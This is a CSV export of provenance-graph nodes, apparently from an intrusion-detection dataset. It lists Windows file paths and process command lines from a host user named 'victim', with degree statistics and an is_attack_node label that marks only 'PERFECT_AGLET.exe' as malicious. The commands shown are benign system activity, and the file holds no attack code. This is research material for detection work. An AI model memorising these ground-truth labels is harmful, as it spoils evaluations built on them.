uuid,annotation,node_order,is_attack_node,in_degree_subgraph,out_degree_subgraph,total_degree_subgraph,in_degree_full,out_degree_full,total_degree_full
61abbdd2-d7fc-41ff-a13e-6abe5e93663d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\ScriptCache\\index-dir\\the-real-index'},872,False,2,1,3,2,1,3
c23d7c48-3212-4ca5-b250-aa479ad4e4ab,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\index-dir\\the-real-index'},877,False,2,1,3,2,1,3
809d6183-d5c6-41b3-b60e-14081c4bbaa2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\index.txt'},880,False,2,1,3,2,1,3
34a4b7e8-0a6a-4f9b-8f0e-93a2f33673e9,{'file': 'C:\\$RECYCLE.BIN\\S-1-5-21-3344029263-1063349748-2086425053-1000\\desktop.ini'},889,False,3,0,3,3,0,3
0168ec71-b437-4bad-829b-e7a8f9211c4f,{'file': 'C:\\Users\\victim\\Downloads\\未确认 948164.crdownload'},890,False,2,1,3,2,1,3
b7a14230-b942-4645-9f0b-d94e561b04b6,{'file': 'C:\\Windows\\System32\\stdole2.tlb'},921,False,1,0,1,3,0,3
27460f48-08df-4e8b-b22f-5186ab8557aa,{'file': 'consent.exe'},935,False,1,0,1,3,0,3
b8e6fc1c-eac2-456f-9c41-f10df89f204c,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},976,False,0,2,2,0,3,3
4548615c-7e1c-4f03-91a4-c078d9028730,"{'subject': 'C:\\Windows\\system32\\cmd.exe /c type ""C:\\Users\\victim\\AppData\\Local\\Temp\\git_version.txt"" 2>nul'}",1039,False,0,2,2,0,3,3
5411840f-1f10-45aa-8fe4-f60dd168a281,"{'subject': 'findstr  -i ""\\.COM \\.EXE \\.BAT \\.CMD \\.PS1 \\.VBS"" '}",1049,False,0,1,1,0,3,3
d2e76e5c-fc56-4f64-bbac-23177de1ff8a,"{'subject': 'C:\\Windows\\system32\\cmd.exe  /S /D /c"" type ""C:\\Users\\victim\\Desktop\\cmder\\config\\user_aliases.cmd"" ""'}",1096,False,0,2,2,0,3,3
4fad691c-bab1-4db4-92be-4c6fc369c8c9,"{'subject': 'C:\\Windows\\system32\\doskey  /listsize=1000 /macrofile=""C:\\Users\\victim\\Desktop\\cmder\\config\\user_aliases.cmd""'}",1100,False,0,1,1,0,3,3
4b5f78ec-7803-4282-8747-cf2cbb215ffa,{'file': 'C:\\Users\\Public\\Desktop\\desktop.ini'},1135,False,3,0,3,3,0,3
02f200ba-4203-4332-b8e1-d4d1bb118c47,{'file': 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clrjit.dll'},1678,False,3,0,3,3,0,3
3fc20111-5745-4560-926c-7c3afdcf67fd,{'file': 'C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Microsoft.PowerShell.Commands.Utility\\v4.0_3.0.0.0__31bf3856ad364e35\\Microsoft.PowerShell.Commands.Utility.dll'},1699,False,3,0,3,3,0,3
51ef924b-f38d-40cb-91da-767485de6122,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},1786,False,0,2,2,0,3,3
c39a4d78-cdc3-4096-9efd-0cfdd5241649,{'file': 'C:\\Users\\victim\\Downloads\\未确认 23274.crdownload'},2356,False,2,1,3,2,1,3
b3f5266a-afc4-4049-829a-d672182aa155,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},2720,False,0,1,1,0,3,3
0ab077a5-a917-4f9d-abea-9941534910e0,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},7053,False,0,2,2,0,3,3
380436a2-b4f5-46af-abfa-455a202c4c67,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},7210,False,0,2,2,0,3,3
01cb65d2-8144-483c-ba59-f49568c98df4,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},7300,False,0,2,2,0,3,3
5fd81c02-5b81-4a3a-87f9-0eed67f3f839,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},8088,False,0,2,2,0,3,3
31366d52-15de-45bb-9b97-92b71ded7bcb,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},8214,False,0,2,2,0,3,3
3940ca43-259d-4d7a-8d1c-c5f8efeab2c0,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},8338,False,0,2,2,0,3,3
b3f3931a-eac2-4fd3-bef2-b59f1f0b9323,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},8446,False,0,2,2,0,3,3
a615f938-7ba2-4c03-b34a-673c878f2b8f,"{'subject': '""C:\\Users\\victim\\Downloads\\PERFECT_AGLET.exe"" '}",10453,True,0,3,3,0,3,3
36ffa520-97f7-4bd4-a968-4646f47bd0e7,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},10646,False,0,2,2,0,3,3
e872a71f-e6d4-42c1-af05-88449cb167f3,{'subject': 'C:\\Windows\\System32\\spoolsv.exe'},234,False,0,1,1,0,2,2
ae8e801e-9a9f-41c3-a6b6-5c5ea2a404c6,{'subject': 'C:\\Windows\\system32\\svchost.exe -k wsappx -p -s AppXSvc'},258,False,0,1,1,0,2,2
bff63736-cad4-41c8-8040-0ca5c4f82108,{'file': 'C:\\Windows\\explorer.exe'},287,False,2,0,2,2,0,2
b1905e04-044b-41df-9890-22105462c10c,{'subject': 'C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding'},334,False,0,1,1,0,2,2
a5bea11d-bdcf-4d49-a226-fd4471023870,{'file': '0:WofCompressedDat'},401,False,2,0,2,2,0,2
9717e6be-fb8d-4e9d-9791-269d3adaefa6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ea153f4c5a8ed11e_0'},613,False,1,1,2,1,1,2
3f7b7cf7-5b12-4f38-8684-1b970a583aec,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ea153f4c5a8ed11e_1'},614,False,1,1,2,1,1,2
dd53a34f-710d-45d8-905e-4d6c9a629ec2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\34651f1f5e3962e1_0'},615,False,1,1,2,1,1,2
667d8470-929b-4d7a-959a-8bdf077417ff,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\34651f1f5e3962e1_1'},616,False,1,1,2,1,1,2
0f2922ba-b152-4960-bda2-39ec4c048a47,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\c0ecc04badf9fe4e_0'},617,False,1,1,2,1,1,2
5379a09b-7da9-4566-a18b-bd04ff2ca8f1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\c0ecc04badf9fe4e_1'},618,False,1,1,2,1,1,2
ad2eb986-775e-46ca-8394-42d760a56d6a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\eeed066dc4dfd368_0'},619,False,1,1,2,1,1,2
d2d340d6-c514-47ae-afa0-6776f238ff4e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\eeed066dc4dfd368_1'},620,False,1,1,2,1,1,2
db53ba2a-2d39-42a7-9ed7-171231d41a5a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\9c548a46a9ecc3f3_0'},621,False,1,1,2,1,1,2
12fe12bd-ce92-40d8-8a95-d3f1f90b517d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\9c548a46a9ecc3f3_1'},622,False,1,1,2,1,1,2
48af2a2d-2956-416d-9828-e229fd4a6b49,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\9abc299c721fc6c8_0'},623,False,1,1,2,1,1,2
d9f386a5-9222-4c01-a863-ef5d3602604a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\9abc299c721fc6c8_1'},624,False,1,1,2,1,1,2
1f78593c-a992-4290-840a-95460b9d3d07,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\71900f6c184705dc_0'},625,False,1,1,2,1,1,2
e50c6bf6-0378-455b-b429-433d1b4764eb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\71900f6c184705dc_1'},626,False,1,1,2,1,1,2
9919e231-5270-4833-b045-3818df490f98,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0e3f91883f72a37f_0'},627,False,1,1,2,1,1,2
a3a87857-cfd9-4c23-bfb7-f5f255071174,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0e3f91883f72a37f_1'},628,False,1,1,2,1,1,2
735584fb-f486-490b-b90f-448cebd10c13,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\7c1a4ccbfe4649fb_0'},629,False,1,1,2,1,1,2
60178ca5-c661-4516-9db4-417b53521798,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\7c1a4ccbfe4649fb_1'},630,False,1,1,2,1,1,2
d58b5fea-c1b4-4c5e-ad7b-113fd833db27,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\cbcb980587d54e76_0'},631,False,1,1,2,1,1,2
79712cf7-b70d-4315-b1c5-9d6fcb61ef71,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\cbcb980587d54e76_1'},632,False,1,1,2,1,1,2
9898b6c7-b8f2-4f3f-b748-c2458df3a338,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\da03453aa0243259_0'},633,False,1,1,2,1,1,2
8357ef35-07ed-488e-b3c8-7a033d9c644b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\da03453aa0243259_1'},634,False,1,1,2,1,1,2
bdf0c9a5-1a82-4cf0-8ab7-d3ae34d48806,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8200563d2cde530a_0'},635,False,1,1,2,1,1,2
3b4efa08-e426-430f-a861-319e068484b8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8200563d2cde530a_1'},636,False,1,1,2,1,1,2
99d84ec4-dc64-4019-ba45-1025560d23cb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\28faffd4bc3eef38_0'},637,False,1,1,2,1,1,2
3a10486c-3180-4a32-97f0-17b38c50bb12,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\28faffd4bc3eef38_1'},638,False,1,1,2,1,1,2
756ded8c-492c-41d4-89e2-fa682297483f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\efaf6b65ee30e35c_0'},639,False,1,1,2,1,1,2
4b27ee32-e93e-4567-a2ea-91e90e2449f8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\efaf6b65ee30e35c_1'},640,False,1,1,2,1,1,2
964fd4ba-30db-4da9-a354-8396d10baf05,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\fd7a9732cf9d29af_0'},641,False,1,1,2,1,1,2
79dc53e3-4cc0-4a7b-adc9-33aa127adf98,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\fd7a9732cf9d29af_1'},642,False,1,1,2,1,1,2
c4c6688e-915f-40b1-80a7-905159fc2f64,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\faee6d8d2c8b7b44_0'},643,False,1,1,2,1,1,2
e22107f4-6c19-411a-973d-afc7d1da7c16,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\faee6d8d2c8b7b44_1'},644,False,1,1,2,1,1,2
a808b821-ed7a-476b-9a3a-c598bee01506,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2e42c035390fca99_0'},645,False,1,1,2,1,1,2
c9d7dddb-43d4-4361-b782-8ea3ab94b971,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2e42c035390fca99_1'},646,False,1,1,2,1,1,2
47e453b1-b02a-431a-829b-11d0adc4748e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\c313000bd77955e3_0'},647,False,1,1,2,1,1,2
19719416-cac7-444d-9b6a-ea4d50860352,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\c313000bd77955e3_1'},648,False,1,1,2,1,1,2
70ac4a5c-fc8a-408b-b74c-6257b37a6be5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\9a71944d0c3a81ca_0'},649,False,1,1,2,1,1,2
182ad1b2-5ec2-4548-a7fb-5b1222c99d15,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\9a71944d0c3a81ca_1'},650,False,1,1,2,1,1,2
03cc9db2-de95-44f3-9c5d-fdbe17bac34b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\cc1c649c486b5cfd_0'},651,False,1,1,2,1,1,2
86cc06a2-2b61-4e83-94df-669492f87b4a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\cc1c649c486b5cfd_1'},652,False,1,1,2,1,1,2
67ae1104-0f27-485b-a4aa-dd3274f9179f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e94f5e78d6937404_0'},653,False,1,1,2,1,1,2
baeb66a3-b0fb-4fc4-82d8-743074ccd557,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e94f5e78d6937404_1'},654,False,1,1,2,1,1,2
736e1501-42ce-484b-872f-619151502853,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\5ef1c56e79993418_1'},655,False,1,1,2,1,1,2
6805303a-5d26-4643-a438-cae4f5738568,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\5ef1c56e79993418_0'},656,False,1,1,2,1,1,2
d33cfe1b-0ba9-4c34-9be6-71f677962e06,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e49f5c1fe5b7ebde_0'},657,False,1,1,2,1,1,2
ecb970d3-1c55-43bc-af18-a1434301522e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e49f5c1fe5b7ebde_1'},658,False,1,1,2,1,1,2
df2343b6-d21a-4e13-9bcc-60b32f318aaf,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\36535ee8017d40d1_0'},659,False,1,1,2,1,1,2
99304ab1-83f5-4b51-86c7-3c6443050541,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\36535ee8017d40d1_1'},660,False,1,1,2,1,1,2
07bd0548-16ce-4066-b6dc-4cea1796afb9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\6822ccb717ca4e3d_0'},661,False,1,1,2,1,1,2
374ce77c-f6bd-45c9-9a7c-022868a600d0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\6822ccb717ca4e3d_1'},662,False,1,1,2,1,1,2
4f52965e-9773-4dc7-aa8f-1565b913de63,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\6cb67d97a6b3818e_0'},663,False,1,1,2,1,1,2
9c6976ba-ac56-48c0-aac0-aa7f5d132561,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\6cb67d97a6b3818e_1'},664,False,1,1,2,1,1,2
119ff01d-af63-4182-add4-aa22d0f7faa9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\63e665bfcc49a593_0'},665,False,1,1,2,1,1,2
d7d66184-d080-437b-bc89-ee69c1d6f6fe,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\63e665bfcc49a593_1'},666,False,1,1,2,1,1,2
253fc1f7-bc5b-4027-9a14-d6f356cc747d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8e38ffd9624144d3_0'},667,False,1,1,2,1,1,2
fd5c0b13-3731-4299-a428-b943700334cc,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8e38ffd9624144d3_1'},668,False,1,1,2,1,1,2
49c44088-9726-4067-b914-fb9540cd78f2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\06819d33dd31b502_0'},669,False,1,1,2,1,1,2
d7942b84-d75b-4abf-8d42-4dd0f64d7c16,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\06819d33dd31b502_1'},670,False,1,1,2,1,1,2
6cc4e256-c6e8-44a3-b866-8ed971af81a3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\aa2f6ea3c3f10dd3_0'},671,False,1,1,2,1,1,2
e1b88314-cafe-4eb9-aaa3-36ffd47e36a4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\aa2f6ea3c3f10dd3_1'},672,False,1,1,2,1,1,2
1ea78e57-87a2-4bd5-bff0-322caeb728f6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\dcb2dbe275c48c9e_0'},673,False,1,1,2,1,1,2
5b2408d0-59bf-4626-887d-beb463a10de6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\dcb2dbe275c48c9e_1'},674,False,1,1,2,1,1,2
